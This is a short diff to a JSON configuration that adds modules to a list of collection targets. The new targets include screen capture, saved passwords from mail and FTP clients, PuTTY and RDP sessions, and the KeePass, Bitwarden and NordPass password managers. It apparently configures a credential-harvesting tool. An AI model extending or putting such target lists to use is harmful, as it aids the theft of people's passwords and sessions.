@@ -25,7 +25,20 @@
     "TelegramAllSessions",
     "OutlookAccounts",
     "WifiPasswords",
-    "FtpVpn"
+    "FtpVpn",
+    "ScreenCaptureAll",
+    "HardwareInfo",
+    "RecentFiles",
+    "DatabaseClients",
+    "ThunderbirdPasswords",
+    "PuttySessions",
+    "FileZillaPasswords",
+    "SavedRDP",
+    "NordPass",
+    "KeePass",
+    "Bitwarden",
+    "AnyDesk",
+    "MobaXterm"
   ],
   "CompressOutput": false
 }
